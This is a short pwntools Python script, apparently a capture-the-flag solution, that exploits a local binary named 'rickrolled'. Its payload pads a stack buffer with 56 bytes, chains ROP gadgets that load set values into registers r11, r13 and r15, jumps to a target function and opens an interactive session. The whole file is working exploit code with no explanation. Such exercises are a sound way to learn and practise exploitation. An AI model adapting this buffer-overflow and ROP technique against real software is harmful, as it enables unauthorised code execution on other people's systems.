from pwn import *

exe = './rickrolled'
p = process(exe)

r11 = p64(0xbeefdead)
r13 = p64(0xabadbeef)
r15 = p64(0xdeadbead)
pop_r11 = p64(0x00000000004011fa)
pop_r13 = p64(0x0000000000401204)
pop_r15 = p64(0x000000000040120e)
rickroll = p64(0x0000000000401214)
payload = b'A'*(48+8) 
payload += pop_r11 + r11 + pop_r13 + r13 + pop_r15 + r15 + rickroll
p.sendline(payload)
p.interactive()
